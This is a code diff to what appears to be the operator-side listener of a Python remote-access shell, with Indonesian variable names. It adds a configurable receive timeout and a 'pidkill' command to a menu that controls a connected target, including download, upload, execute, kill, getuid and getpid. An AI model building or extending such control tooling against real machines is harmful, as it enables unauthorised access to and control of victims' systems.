@@ -24,9 +24,9 @@ except KeyboardInterrupt:
     print('exiting listener')
     sys.exit()
 
-def recv_status_priv():
+def recv_status_priv(sec):
     try:
-        _target.settimeout(5)
+        _target.settimeout(sec)
         status = _target.recv(1024).decode()
         return status
     except:
@@ -271,7 +271,7 @@ def shellc():
             elif perintah == 'clear':
                 os.system('clear')
             elif perintah[:3] == 'cd ':
-                pass
+                print(recv_status_priv(0.5))
             elif perintah[:8] == 'download':
                 download_file(perintah[9:])
             elif perintah[:6] == 'upload':
@@ -352,7 +352,9 @@ def shellc():
                     ================================
                     -execute    >> start program
 
-                    -kill       >> kill program
+                    -kill       >> kill program by image name
+                      
+                    -pidkill    >> kill program by pid name
                     ================================
                       
                         get id:
@@ -374,10 +376,12 @@ def shellc():
                 pass  
             elif perintah[:4] == 'kill':
                 pass  
+            elif perintah[:7] == 'pidkill':
+                pass
             elif perintah == 'getuid':
-                print(recv_status_priv())
+                print(recv_status_priv(2))
             elif perintah == 'getpid':
-                print(f"Current PID: {recv_status_priv()}")
+                print(f"Current PID: {recv_status_priv(2)}")
             else:
                 hasil = data_diterima()
                 print(hasil)
